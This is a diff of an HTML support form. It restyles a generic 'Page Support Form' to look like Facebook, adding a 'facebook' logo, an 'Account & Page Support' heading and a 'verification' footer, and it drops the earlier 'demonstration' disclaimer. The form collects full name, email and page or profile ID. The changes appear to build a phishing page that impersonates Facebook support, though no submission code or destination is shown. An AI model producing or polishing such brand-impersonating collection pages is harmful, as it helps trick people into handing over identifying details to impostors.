@@ -2,60 +2,70 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Page Support Form</title>
+  <title>Account Support</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
     body {
       margin: 0;
       background: #f0f2f5;
-      font-family: Arial, sans-serif;
+      font-family: Helvetica, Arial, sans-serif;
     }
 
     .container {
-      max-width: 420px;
-      margin: 60px auto;
+      max-width: 400px;
+      margin: 70px auto;
       background: #ffffff;
-      padding: 25px;
+      padding: 24px;
       border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
     }
 
-    h2 {
+    .logo {
       text-align: center;
+      font-size: 28px;
+      font-weight: bold;
       color: #1877f2;
+      margin-bottom: 15px;
+    }
+
+    h3 {
+      text-align: center;
+      font-size: 18px;
+      color: #1c1e21;
       margin-bottom: 20px;
     }
 
     label {
-      font-size: 14px;
-      color: #444;
-      display: block;
+      font-size: 13px;
+      color: #606770;
       margin-bottom: 6px;
+      display: block;
     }
 
-    input, textarea {
+    input {
       width: 100%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
+      padding: 11px;
       font-size: 14px;
+      border-radius: 6px;
+      border: 1px solid #ccd0d5;
+      margin-bottom: 14px;
     }
 
-    textarea {
-      resize: none;
-      height: 90px;
+    input:focus {
+      outline: none;
+      border-color: #1877f2;
     }
 
     button {
       width: 100%;
       background: #1877f2;
-      color: white;
-      border: none;
-      padding: 12px;
-      border-radius: 6px;
+      color: #ffffff;
       font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
       cursor: pointer;
     }
 
@@ -63,10 +73,10 @@
       background: #166fe5;
     }
 
-    .note {
-      margin-top: 15px;
+    .footer-text {
+      margin-top: 16px;
       font-size: 12px;
-      color: #777;
+      color: #65676b;
       text-align: center;
     }
   </style>
@@ -75,11 +85,13 @@
 <body>
 
   <div class="container">
-    <h2>Page Support Form</h2>
+    <div class="logo">facebook</div>
+
+    <h3>Account & Page Support</h3>
 
     <form>
       <label>Full Name</label>
-      <input type="text" placeholder="Enter your name" required>
+      <input type="text" placeholder="Enter your full name" required>
 
       <label>Email Address</label>
       <input type="email" placeholder="Enter your email" required>
@@ -87,14 +99,11 @@
       <label>Page or Profile ID</label>
       <input type="text" placeholder="Enter ID or page name" required>
 
-      <label>Describe Your Issue</label>
-      <textarea placeholder="Explain your issue here..." required></textarea>
-
-      <button type="submit">Submit Request</button>
+      <button type="submit">Submit</button>
     </form>
 
-    <div class="note">
-      This form is for demonstration & support purposes only.
+    <div class="footer-text">
+      This page is for support & verification purposes only.
     </div>
   </div>
 
